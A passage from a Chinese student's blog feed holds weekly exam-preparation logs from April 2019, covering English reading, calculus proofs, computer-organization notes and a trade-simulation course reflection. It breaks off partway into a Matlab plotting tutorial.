PC的位数一般和存储器存储器地址一样</p></blockquote><p>通过上述的解释，我们知道转移指令在执行的时候，需要检测看是否满足转移的条件，如果满足才能进行转移，即修改为指令的目标地址，否则并不会成功发生转移，所以这道题应该选择C。（第一次做的时候选择了B）</p><ul><li>指令译码是对指令的<font color="red">操作码</font>进行译码，而<font color="red">非地址码</font></li><li>取指操作是自动进行的，不需要得到其他指令的辅助</li><li>基址寻址主要应用于<font color="red">多道程序设计和编制浮动程序</font>；变址寻址主要应用于<font color="red">数组处理和循环程序</font>。（上周遗忘的内容）</li><li>数据通路是否采用CPU内部总线的特点：<br>采用：结构简单、实现容易、性能较低、冲突较多<br>不采用：结构复杂、不易实现、硬件量大、性能高、冲突小</li><li><font color="red">注意：5.4.1 控制器的功能和工作原理 小结中，该部分的内容看的不是很懂，之后有时间看点视频补充下</font></li><li>对流水线影响主要有结构相关、数据相关、控制相关三个因素，其中影响最大的因素是数据相关。</li><li>总线的分类中主要有片内总线、系统系统、通信总线，其中需要特别留意系统总线。</li><li>总线复用技术是指<font color="red">一种信号线不同的时间传输不同的信息</font>，可以节省空间和成本，但是<font color="red">不能提高传输率</font></li><li>USB（通用串行总线）的特点：即插即用、热插拔、连接能力强、扩充性好、高速传输</li><li>键盘通常以矩阵的形式排列按键、每个键相当于一个开关，按下按键则电信号接通，松开按键时弹簧弹起，电信号断开（将ASCII码传给主机的过程）。主要有：薄膜键盘、机械键盘、静电容键盘</li><li>屏幕大小指的是对角线的长度，并非长度和宽度</li><li>灰度级表示的是显示的像素带点亮暗的差别，灰度级越多，图像层次越清楚、逼真。</li><li><p>显示存储器（VRAM）有图像分辨率和灰度级所决定，它们之间的关系如下：</p><script type="math/tex; mode=display">VRAM容量=分辨率 * 灰度级位数 \\VRAM带宽=分辨率 * 灰度级位数 * 帧频</script></li><li><p>DMA方式（重点），该部分内容在操作系统中记录</p></li></ul><h2 id="下周复习计划"><a href="#下周复习计划" class="headerlink" title="下周复习计划"></a>下周复习计划</h2><ul><li>英语词汇继续复习，并且适当的收集往年真题中的生词及词组，在词汇的学习中适当观看恋练有词的配套视频，继续坚持每天两篇阅读的进度</li><li>数学没什么好说的，基本适当刷题的状态</li><li>408下周开始复习《操作系统》，打算复习前两个章节</li></ul><div style="text-align: right">2019-04-22,By 木子</div>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;font color=&quot;orange&quot;&gt;志向是天才的幼苗，经过热爱劳动的双手培育，在肥田沃土里将成长为粗壮的大树。不热爱劳动，不进行自我教育，志向这棵幼苗也会连根枯死。确定个人志向，选好专业，这是幸福的源泉。&lt;/font&gt;
&lt;font color=&quot;orange&quot;&gt;&lt;div style=&quot;text-align: right&quot;&gt;—— 苏霍姆林斯基&lt;/div&gt;&lt;/font&gt;


&lt;/blockquote&gt;
&lt;p&gt;现在是2019年4月22日，距离2020考研还有&lt;strong&gt;&lt;font color=&quot;red&quot;&gt;244&lt;/font&gt;&lt;/strong&gt;天。这是Log的第二周，和往常一样，过着三点一线的生活，只不过这周的食欲不是很好，什么都不太想吃。此外，最近最大的变化就是对时间越来越敏感了，眼睛一睁一闭，一天就过去了，时间溜得贼快，感觉一天下来还没完成多少任务就已经结束了。&lt;/p&gt;
&lt;h2 id=&quot;Log内容&quot;&gt;&lt;a href=&quot;#Log内容&quot; class=&quot;headerlink&quot; title=&quot;Log内容&quot;&gt;&lt;/a&gt;Log内容&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;本周复习状况&lt;/li&gt;
&lt;li&gt;下周复习计划&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="随写" scheme="https://muzimz.cn/categories/%E9%9A%8F%E5%86%99/"/>
    
    
      <category term="随写" scheme="https://muzimz.cn/tags/%E9%9A%8F%E5%86%99/"/>
    
  </entry>
  
  <entry>
    <title>随写录1（4.8-4.14）</title>
    <link href="https://muzimz.cn/2019/04/15/%E9%9A%8F%E5%86%99%E5%BD%951%EF%BC%884.8-4.14%EF%BC%89/"/>
    <id>https://muzimz.cn/2019/04/15/随写录1（4.8-4.14）/</id>
    <published>2019-04-15T15:16:33.000Z</published>
    <updated>2020-02-21T02:19:34.800Z</updated>
    
    <content type="html"><![CDATA[<blockquote><font color="orange">与其用华丽的外衣装饰自己，不如用知识武装自己。</font><font color="orange"><div style="text-align: right">—— 马克思</div></font></blockquote><p>现在是2019年4月15日，距离2020考研还有<strong><font color="red">251</font></strong>天。自大一开始我就已经打算选择走上考研这条路，真正开始准备考研是在大三上学期，当时大部分精力主要用来倒腾Python和Java，只有一小部分时间放在学习408专业课，庆幸的是经过半年的时间已经成功把《数据结构》、《计算机组成原理》、《操作系统》、《计算机网络》四门专业课匆匆的过了一遍。在学习专业课的过程中主要使用的是教材外加王道4本辅导书，倘若书上的知识点有点晦涩难懂的话，就会选择王道配套的视频进行补充。使用的教材和辅导书如下：</p><ol><li>《数据结构》严蔚敏 清华大学出版社 </li><li>《计算机组成原理》唐朔飞 高等教育出版社 </li><li>《计算机操作系统(修订版)》汤子瀛 西安电子科技大学出版社 </li><li>《计算机网络(第五版)》谢希仁 电子工业出版社 </li><li>《2019年数据结构考研复习指导》王道论坛 电子工业出版社</li><li>《2019年计算机组成原理考研复习指导》 王道论坛 电子工业出版社</li><li>《2019年操作系统考研复习指导》 王道论坛 电子工业出版社</li><li>《2019年计算机网络考研复习指导》 王道论坛 电子工业出版社</li></ol><p>在进行第一轮专业课学习的时候，主要是集中在基本概念以及理论知识的理解，并没有通过大量的习题来进行巩固。另外，由于当时王道2020年的辅导书还没有出版，所以辅导书使用的图书馆的馆藏书。通过一轮专业课的学习下来，第一感觉就是理论知识太多，由于自己又是跨考生，再加上江湖有着408变态难的传言，所以当时的内心多少还是有点崩溃。但是换个角度来想，还有一年的时间供自己复习，所以不到最后一刻不要轻言放弃。</p><p>“逝者如斯夫，不舍昼夜。”，时间一分一秒的流逝，离考研的日子越来越近，自己的压力越来越大，内心越来越焦虑。为了更加坚定自己的目标，为了有个更好的学习环境，为了更好的记录考研的历程，所以从现在开始打算每周一在这打卡，主要是记录上一周的学习情况，以及可能会分享一些其他个人日常。由于周一的课比较多，任务相对来讲比较繁重，只有一些琐碎的时间可供个人支配，所以将每周的学习日志于周一更新。正如《超兽武装》中火麟飞说过这么一句话：“每个人都有彷徨的时候，彷徨并不可怕，可怕的是在彷徨中不做抉择。因为一旦有抉择，就不会再彷徨，就会按照既定的方向去行事。”，是的，既然选择了考研这条路，希望自己能够坚持下去，不为自己做出的决定而感到遗憾。</p><a id="more"></a><h2 id="Log内容"><a href="#Log内容" class="headerlink" title="Log内容"></a>Log内容</h2><ul><li>本周复习状况</li><li>下周复习计划</li><li>Simtrade实验总结</li></ul><h2 id="本周复习状况"><a href="#本周复习状况" class="headerlink" title="本周复习状况"></a>本周复习状况</h2><h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><p>英语的复习现在主要是集中在阅读理解和词汇上面。词汇的学习是定在每天早上的6:00-8:00之间，现在还没有养成早起的习惯，有的时候就会不知不觉的睡过去(ノへ￣、)，希望能够尽早习惯起来。英语的词汇学习使用的主要是朱伟的《恋练有词》外加配套视频，阅读理解部分是计划每天坚持精做1-2篇阅读，偶尔观看考虫王琢或者唐迟的课程。</p><p>本周感觉最大的收获就是英语了，自从看了关于英语阅读理解的网课，感觉相当的受益。以前的自己只是想当然的以为英语只有多做题，只有在题海中总结自己的经验才能有所提高，但现在才发现这个想法是多么的错误。我们不是圣人，也没有太多的时间和能力去研究其中的奥秘，现在的我们应该要站在巨人的肩膀上来取得进步，刷题是没错，但刷题的前提是要先掌握好解题的方法，否则只会浪费自己太多宝贵的时间。所以说今后需要抽点时间适当的看看视频，获取一下前辈们总结的经验。</p><center><img src="https://i.loli.net/2019/05/01/5cc976952737e.jpg" width="600"></center><p>（可不是打广告）王琢老师的阅读课程简直不要太好了，每道阅读题都会给你别样的解题方式，在解题的过程中还会不断的传授解题的方法和技巧，并且会解释考题中的各种套路，其中最让我印象深刻的是“呵呵词”的讲解：在实际做阅读理解过程中，如果有那么一道题是问关于某某某态度的话，那么选项中有如上的“呵呵词”，就千万不能选，课后我通过大量真题的验证，发现果真如此。当然，在平时做阅读理解的过程我们不要太依赖这种投机取巧的方法，而是要知其然，更要知其所以然。</p><h4 id="周周长难句："><a href="#周周长难句：" class="headerlink" title="周周长难句："></a>周周长难句：</h4><blockquote><p>The conventional view that education should be one of the very heighest priorities for promoting rapid economic development in poor countries is wrong.<br>传统观点认为：为了促进贫穷国家经济快速发展，教育应作为最优先的考虑之一，这个观点是错误的</p></blockquote><font color="red">① The conventional view </font> <font color="green">② that education should be one of the very heighest priorities</font><font color="orange">③ for promoting rapid economic development in poor countries</font><font color="yellow">④ is wrong.</font><p>①： 主干。主系表，缩句之后是 view is wrong<br>②： 修饰。that引导的同位语从句，具体说明view 的内容<br>③： 修饰。介词短语fot作原因状语，修饰上述观点，解释原因</p><p>重要单词：<br>conventional 传统的<br>priority： 优先<br>promote： 促进，促销，使晋级</p><h3 id="数学"><a href="#数学" class="headerlink" title="数学"></a>数学</h3><p>关于数学，我自认为数学的学习不像英语阅读理解，解数学题的时候没有所谓的捷径，只有套路。在已经掌握了基本概念的前提下，我们只有通过大量的练习才能有所进步，正所谓孰能生巧嘛，所以数学的话我会每周更新几道题目来记录，一方面将有价值的题目永远保存，另方面熟悉下<code>Latex</code>的语法。</p><blockquote><p>Q1: $f’(x)在[a,b]上连续，f(a)=0,证：\int_a^bf^2(x)dx\leq\frac{(b-a)^2}{2}\int_a^b[f’(x)]^2dx$</p></blockquote><p>分析：显然，这是一道证明题。题目中给出了函数$f(x)$的一个零点，让我们证明右边的不等式。通过观察所要证明的不等式，我们可以发现右式存在两端点相减，且不等式两边存在着导数形式，通过初步判断，这道题主要考察的是柯西定理、拉格朗日定理、函数构造等的熟练掌握程度，所以本题的解法有多种，以下给出使用柯西定理求解这道题的过程。</p><script type="math/tex; mode=display">    \begin{align}        \frac{\int_a^bf^2(x)dx}{(b-a)^2}        &=\frac{\int_a^bf^2(x)dx-\int_a^af^2(x)dx}{(b-a)^2-(a-a)^2} \\        & = \frac{f^2(\xi)}{2(\xi-a)}=\frac{(\int_a^{\xi}1*f'(t)dt)^2}{2(\xi-a)} \\        & \leq\frac{\int_a^{\xi}1^2dt\int_a^{\xi}[f'(t)]^2dt}{2(\xi-a)} \\        & = \frac{(\xi-a)\int_a^{\xi}[f'(t)]^2dt}{2(\xi-a)} \\        & = \frac{1}{2}\int_a^{\xi}[f'(t)]^2dt \leq \frac{1}{2}\int_a^b[f'(x)]^2dx    \end{align}</script><blockquote><p>求 ${\lim_{x \to 0}}\frac{tan(tanx)-sin(sinx)}{x-sinx}$</p></blockquote><p>分析： 这是一道极限题。初步一看上下都趋近于零，可是使用万能的洛必达进行求解。但是在你使用洛必达的过程中会相当的繁琐，在考试的过程中不仅会浪费大量的时间还会影响自己的心态。如上题一样，我们通过观察可发现，这道题同样存在减的形式，我们应该从拉格朗日的角度出发。但我们观察分子会发现，这是两个不同的三角函数，似乎并不满足拉格的使用条件，所以我们需要对其进行适当的变化，最后通过泰勒的辅助即可解决此题。本题式子太多，不便使用<code>Latex</code>，所以直接贴图了。</p><center><img src="https://i.loli.net/2019/05/01/5cc976ee47158.jpg" width="500"></center><h3 id="408"><a href="#408" class="headerlink" title="408"></a>408</h3><p>本周408的复习还行，主要是将计算机组成原理的前四个章节复习了一遍，其中包含以下内容：</p><ul><li>计算机系统概述</li><li>数据的表示和运算</li><li>存储系统</li><li>指令系统</li></ul><p>在做题巩固的过程中，发现不少之前第一轮学习的漏洞没有解决，这也印证了只有在实践的过程中才能发现自身的不足，以下记录一些容易遗漏或者被忽视的小知识点，希望日后能引起注意：</p><ul><li>高级语言、汇编语言、机器语言三者之间的关系。</li></ul><center><img src="https://i.loli.net/2019/05/01/5cc976ee45521.jpg"></center><p>由高级语言向汇编语言转换的过程称为编译，把汇编语言翻译成机器语言的过程称为汇编；由高级需要直接转换为机器语言的过程称为解释。</p><p><font color="red">翻译程序包括编译程序和解释程序。其中编译的过程是先全部翻译成，不需要重新进行编译。而解释程序是翻译一条，执行一条，在这个过程中不会生成目标程序。（主要的区别看是否生成目标程序，以做题的经验来看，这个知识点尤为重要，一定要理解并熟记），比如下面16年统考的一道选择题：</font></p><blockquote><p>将高级语言程序转换为机器级目标代码文件的程序是（C）<br>A： 汇编程序  &nbsp;&nbsp;&nbsp;&nbsp;  B：链接程序 &nbsp;&nbsp;&nbsp;&nbsp; C：编译程序&nbsp;&nbsp;&nbsp;&nbsp; D：解释程序</p></blockquote><p>分析： 由上述图可知，高级语言向机器语言的转化有两个途径，但能够产生目标文件的应该是编译程序，而非解释程序，所以应该选择C选项。<br>（我第一次做的时候就选了D，总结后发现还是由于自身知识点的漏洞导致的，所以说我们在复习的时候一定要尽可能的全面，不要有侥幸心理：这个不会考，那个不会考。假如因为向这种简单题而造成失分，那肯定得不偿失。）</p><ul><li>某一功能既可以使用硬件来实现，有可以使用软件来进行实现，他们在逻辑上是等效的。<font color="red">注意：是“等效”，不是”等价”</font></li><li>兼容是计算机软件或硬件的通用性。<font color="red">注意：是“或”，不是“和”</font></li><li>主存的工作方式是按存储单元的地址进行存取，而相联存储器（TLB、快表）即可以按照地址又可以按照内容。<font color="red">注意选择题</font></li><li>地址译码器属于主存，而非CPU。</li><li>系统吞吐量主要取决于主存的<font color="red">存取周期</font></li><li>CPI:执行一条所需要的时钟周期数。它与系统结构、指令集、计算机组织有关，而与时钟频率无关</li><li>透明：地址寄存器、数据寄存器、IR。不透明：通用寄存器、程序状态、PC</li><li>定点机器数的加减运算<br>倘若让你计算 <code>13+11=</code> 和 <code>13-11=</code> 的值，相信没人会做不出来。但是计算机在计算该加减的过程是怎样的呢。机器数的加减主要是将原数转化为补码形式，然后在进行运算，下面以一个例子来模拟该过程：<br>例：N=5，X=+13，Y=-11，求X+Y，X-Y，Y-X</li></ul><center><img src="https://i.loli.net/2019/05/01/5cc976ee3da99.jpg" width="600"></center><ul><li>定点机器数的乘除运算<br>定点机器数的乘除运算与加减不同，它的过程相对来说要复杂的多，我暂时也还没有掌握其要领，所以暂时不在此记录，以后更新。</li><li>使用IEEE 754标准表示浮点数时，注意短浮点数、长浮点数、临时浮点数的其他别名。</li><li>SRAM（静态随机存储器）主要应用于缓存，其不需要进行刷新。而DRAM（动态随机存储器）主要应用于内存，其需要进行刷新（以行为单位进行刷新），且三种刷新方式中只有分散刷新不存在死区（死时间）</li><li>在大多数题目中，会考察Cache的命中率或者是Cache的访问时间，但少数题会考察系统的效率，关于该问题，王道中并没有记录，所以在此记录一下：<script type="math/tex; mode=display">系统效率=\frac{Cache访问时间}{平均访问时间}</script></li></ul><h2 id="下周复习计划"><a href="#下周复习计划" class="headerlink" title="下周复习计划"></a>下周复习计划</h2><ol><li>英语把剩下的单词都解决了，阅读继续每日两篇并抽时间看点课程，阅读主要是1999年-2004年的经典真题</li><li>数学继续刷题（复习全书习题、过关660题）</li><li>408把组成原理剩下的章节复习完，并通过习题进行一定的巩固（王道计算机组成原理、高教版计算机专业综合考试大纲解析）</li></ol><h2 id="Simtrade实验总结"><a href="#Simtrade实验总结" class="headerlink" title="Simtrade实验总结"></a>Simtrade实验总结</h2><p>本周还是挺忙的，学校的任务比较多，花费了不少时间放在进出口实验上，从建立业务联系到最后的结汇每一步都需要不断的实践，总共需要完成5个单子，还是有点崩溃。不管怎么样这本课程也算是结束了，简单的写个总结吧：</p><center>Simtrade实验总结</center><p>至此，《进出口货物贸易综合实验》这门课程基本已经结束了，回想一下，收益颇多，但还有很多地方做的不尽如人意，在这课程结束之际，现做一个简短的回顾及总结。</p><p>鄙人性格比较内向，平时沉默寡言，形单影只，更偏向于理科，在现实生活中自认为不具备做贸易的条件，而且在《进出口货物贸易综合实验》这门课程中的表现的也不够满意。所以起初对待这门课程也只是一种应付式的态度去学习，上课期间总是忙于做自己的事情，并没有像大家那样积极的去融入这门课程。不如意事常八九，可与语人无二三，尽管自己不是很擅长这门课程，但还是需要坚持完成老师交给的任务。直至课程后期才开始用心对待这门课程，通过 Simtrade系统的实践，让我对实际贸易流程用了一个更加完整的认识。</p><p>从开始进出口双方业务联系的建立到最后的结汇，这其中的每一个流程在实际贸易过程中都至关重要，我们必须熟练的操作每一个步骤才能成功实现交易。在这次课程中，我发现自己有以下一些能力还有待提高：</p><ol><li>在PPT的制作过程中，形式单一，没有背景音乐以及视频的辅助。在小组PPT英文产品展示的时候，自己的英文能力不足，再加上自己内向的性格以及全程录像，导致在展示过程中没有让观众留下一个好的影响，的确遗憾。</li><li>在制作进口预算表以及出口预算表的时候，由于自己的专业知识储备不够，导致最终该部分的得分较低，在以后的学习过程中我会更加努力积累专业知识。</li><li>由于前期对这门课程的不在乎，导致后面的进度完全更不上，所以在课下花费了大量的时间和精力来弥补该部分的残缺，而且还多次求助于同学，实属不该。积土成山，积水成渊，学习的过程从来都不是一蹴而就的，我们需要每天不断地保持一颗努力学习的心才能有所进步。今日事，今日毕，如果我们将大量的任务积累至后期的话，只能给自己带来更多的负罪感。 </li><li>……    </li></ol><p>最后希望自己好好学习，天天向上，在今后的学习生活中越走越远。</p><div style="text-align: right">2019-04-15,By 木子</div>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;font color=&quot;orange&quot;&gt;与其用华丽的外衣装饰自己，不如用知识武装自己。&lt;/font&gt;
&lt;font color=&quot;orange&quot;&gt;&lt;div style=&quot;text-align: right&quot;&gt;—— 马克思&lt;/div&gt;&lt;/font&gt;


&lt;/blockquote&gt;
&lt;p&gt;现在是2019年4月15日，距离2020考研还有&lt;strong&gt;&lt;font color=&quot;red&quot;&gt;251&lt;/font&gt;&lt;/strong&gt;天。自大一开始我就已经打算选择走上考研这条路，真正开始准备考研是在大三上学期，当时大部分精力主要用来倒腾Python和Java，只有一小部分时间放在学习408专业课，庆幸的是经过半年的时间已经成功把《数据结构》、《计算机组成原理》、《操作系统》、《计算机网络》四门专业课匆匆的过了一遍。在学习专业课的过程中主要使用的是教材外加王道4本辅导书，倘若书上的知识点有点晦涩难懂的话，就会选择王道配套的视频进行补充。使用的教材和辅导书如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;《数据结构》严蔚敏 清华大学出版社 &lt;/li&gt;
&lt;li&gt;《计算机组成原理》唐朔飞 高等教育出版社 &lt;/li&gt;
&lt;li&gt;《计算机操作系统(修订版)》汤子瀛 西安电子科技大学出版社 &lt;/li&gt;
&lt;li&gt;《计算机网络(第五版)》谢希仁 电子工业出版社 &lt;/li&gt;
&lt;li&gt;《2019年数据结构考研复习指导》王道论坛 电子工业出版社&lt;/li&gt;
&lt;li&gt;《2019年计算机组成原理考研复习指导》 王道论坛 电子工业出版社&lt;/li&gt;
&lt;li&gt;《2019年操作系统考研复习指导》 王道论坛 电子工业出版社&lt;/li&gt;
&lt;li&gt;《2019年计算机网络考研复习指导》 王道论坛 电子工业出版社&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;在进行第一轮专业课学习的时候，主要是集中在基本概念以及理论知识的理解，并没有通过大量的习题来进行巩固。另外，由于当时王道2020年的辅导书还没有出版，所以辅导书使用的图书馆的馆藏书。通过一轮专业课的学习下来，第一感觉就是理论知识太多，由于自己又是跨考生，再加上江湖有着408变态难的传言，所以当时的内心多少还是有点崩溃。但是换个角度来想，还有一年的时间供自己复习，所以不到最后一刻不要轻言放弃。&lt;/p&gt;
&lt;p&gt;“逝者如斯夫，不舍昼夜。”，时间一分一秒的流逝，离考研的日子越来越近，自己的压力越来越大，内心越来越焦虑。为了更加坚定自己的目标，为了有个更好的学习环境，为了更好的记录考研的历程，所以从现在开始打算每周一在这打卡，主要是记录上一周的学习情况，以及可能会分享一些其他个人日常。由于周一的课比较多，任务相对来讲比较繁重，只有一些琐碎的时间可供个人支配，所以将每周的学习日志于周一更新。正如《超兽武装》中火麟飞说过这么一句话：“每个人都有彷徨的时候，彷徨并不可怕，可怕的是在彷徨中不做抉择。因为一旦有抉择，就不会再彷徨，就会按照既定的方向去行事。”，是的，既然选择了考研这条路，希望自己能够坚持下去，不为自己做出的决定而感到遗憾。&lt;/p&gt;
    
    </summary>
    
      <category term="随写" scheme="https://muzimz.cn/categories/%E9%9A%8F%E5%86%99/"/>
    
    
      <category term="随写" scheme="https://muzimz.cn/tags/%E9%9A%8F%E5%86%99/"/>
    
  </entry>
  
  <entry>
    <title>Matlab常见的绘图Api</title>
    <link href="https://muzimz.cn/2019/02/26/Matlab%E5%B8%B8%E8%A7%81%E7%9A%84%E7%BB%98%E5%9B%BEApi/"/>
    <id>https://muzimz.cn/2019/02/26/Matlab常见的绘图Api/</id>
    <published>2019-02-26T06:26:53.000Z</published>
    <updated>2020-02-21T03:08:03.062Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Matlab常见的绘图Api"><a href="#Matlab常见的绘图Api" class="headerlink" title="Matlab常见的绘图Api"></a><center>Matlab常见的绘图Api</center></h1><h2 id="基本分割"><a href="#基本分割" class="headerlink" title="基本分割"></a>基本分割</h2><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x = linspace(<span class="number">0</span>,<span class="number">100</span>,<span class="number">100</span>) % 成线性等分</span><br><span class="line">y = logspace(<span class="number">0</span>, <span class="number">100</span>, <span class="number">100</span>) % 成对数分割</span><br></pre></td></tr></table></figure><h2 id="plot基本绘图"><a href="#plot基本绘图" class="headerlink" title="plot基本绘图"></a>plot基本绘图</h2><ul><li><p>1.绘制一条曲线</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="built_in">linspace</span>(<span class="number">0</span>, <span class="number">2</span>*<span class="built_in">pi</span>, <span class="number">100</span>) <span class="comment">% 默认100等分</span></span><br><span class="line"><span class="built_in">plot</span>(x, <span class="built_in">sin</span>(x))</span><br></pre></td></tr></table></figure></li><li><p>2.绘制多条曲线</p></li></ul><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">x</span> = linspace(<span class="number">0</span>, <span class="number">2</span>*pi)<span class="comment">;</span></span><br><span class="line"><span class="comment">plot(x, sin(x), "o", x, cos(x), "x", x, sin(x)+cos(x)), "*";</span></span><br><span class="line"><span class="comment">% "o"表示不同图标绘图（marker）</span></span><br></pre></td></tr></table></figure><ul><li>3.根据矩阵绘图<script type="math/tex; mode=display">X=\left|  \begin{matrix}      x_{11} & x_{12} & x_{13} & \cdots & x_{1n}\\      x_{21} & x_{22} & x_{23} & \cdots & x_{2n}\\      x_{31} & x_{32} & x_{33} & \cdots & x_{3n}\\      \vdots & \vdots & \vdots & \ddots & \vdots\\      x_{n1} & x_{n2} & x_{n3} & \cdots & x_{nn}\\  \end{matrix} \right|</script></li></ul><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">plot</span>(X) <span class="comment">% 会得到n条曲线</span></span><br></pre></td></tr></table></figure><p>以下是一些例子：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span> peaks 产生一个<span class="number">49</span>x<span class="number">49</span>的矩阵，代表二维函数的值</span><br><span class="line">x = peaks<span class="comment">()</span>;</span><br><span class="line"><span class="meta">%</span> plot<span class="comment">()</span>直接绘制<span class="number">49</span>条直线，类似于直接从侧面看peaks，直接运行peaks<span class="comment">()</span>方法可见立体效果</span><br><span class="line">plot<span class="comment">(x)</span>;</span><br></pre></td></tr></table></figure><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x = peaks();</span><br><span class="line">y = x';  % 将x转置</span><br><span class="line">plot(x, y);</span><br></pre></td></tr></table></figure><ul><li>根据复数绘图</li></ul><p>z为复数时，plot(z)是将z的实部和虚部当做x，y坐标来作圆</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x = randn(<span class="number">30</span>)<span class="comment">; % 产生30x30矩阵</span></span><br><span class="line">z = eig(<span class="name">x</span>)<span class="comment">; % 计算x的固有值</span></span><br><span class="line">plot(<span class="name">z</span>, <span class="string">"o"</span>)<span class="comment">;</span></span><br><span class="line">grid on<span class="comment">;</span></span><br></pre></td></tr></table></figure><ul><li>绘制两条分别对应两个y轴的图</li></ul><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">x</span> = linspace(<span class="number">0</span>, <span class="number">2</span>*pi)<span class="comment">;</span></span><br><span class="line"><span class="comment">plotyy(x, sin(x), x, exp(x));</span></span><br></pre></td></tr></table></figure><ul><li>subplot()</li></ul><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="built_in">linspace</span>(<span class="number">0</span>,<span class="number">2</span>*<span class="built_in">pi</span>);</span><br><span class="line">subplot(<span class="number">221</span>);<span class="built_in">plot</span>(x, <span class="built_in">sin</span>(x));</span><br><span class="line">subplot(<span class="number">222</span>);<span class="built_in">plot</span>(x, <span class="built_in">cos</span>(x));</span><br></pre></td></tr></table></figure><ul><li>plot的其他一些例子</li></ul><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="number">0</span>:<span class="number">0.5</span>:<span class="number">4</span>*<span class="built_in">pi</span>;</span><br><span class="line"><span class="built_in">plot</span>(x, <span class="built_in">sin</span>(x), <span class="string">'k:diamond'</span>);</span><br></pre></td></tr></table></figure><h2 id="极坐标绘图（polar）"><a href="#极坐标绘图（polar）" class="headerlink" title="极坐标绘图（polar）"></a>极坐标绘图（polar）</h2><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">theta = linspace(<span class="number">0</span>, <span class="number">2</span>*pi);</span><br><span class="line">r = cos(4*theta)<span class="comment">;</span></span><br><span class="line">polar(<span class="name">theta</span>, r)<span class="comment">;</span></span><br></pre></td></tr></table></figure><h2 id="绘制直方图-hist"><a href="#绘制直方图-hist" class="headerlink" title="绘制直方图(hist)"></a>绘制直方图(hist)</h2><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x = randn(<span class="number">10000</span>, <span class="number">1</span>)<span class="comment">;</span></span><br><span class="line">hist(<span class="name">x</span>, <span class="number">25</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure><h2 id="绘制条形图"><a href="#绘制条形图" class="headerlink" title="绘制条形图"></a>绘制条形图</h2><ul><li><p>绘制1个条形图</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x = [<span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span>];</span><br><span class="line">bar(x);</span><br></pre></td></tr></table></figure></li><li><p>绘制2个条形图</p></li></ul><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x = [<span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span>; <span class="number">5</span> <span class="number">4</span> <span class="number">3</span> <span class="number">2</span> <span class="number">1</span>]; </span><br><span class="line">bar(x);</span><br></pre></td></tr></table></figure><ul><li>绘制立体条形图bar3</li></ul><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x = [<span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span>; <span class="number">5</span> <span class="number">4</span> <span class="number">3</span> <span class="number">2</span> <span class="number">1</span>];</span><br><span class="line">bar3(x);</span><br><span class="line">bar3(x, <span class="string">"group"</span>); % 使用群组方式绘制</span><br></pre></td></tr></table></figure><ul><li>水平条形图barh、bar3h</li></ul><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">x = [<span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span>];</span><br><span class="line">y = [<span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span> ;<span class="number">5</span> <span class="number">4</span> <span class="number">3</span> <span class="number">2</span> <span class="number">1</span>];</span><br><span class="line">barh(x);</span><br><span class="line">barh(y);</span><br><span class="line">bar3h(x);</span><br><span class="line">bar3h(y)</span><br></pre></td></tr></table></figure><blockquote><p>案例：使用条形图绘制月平均温度</p></blockquote><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">x = <span 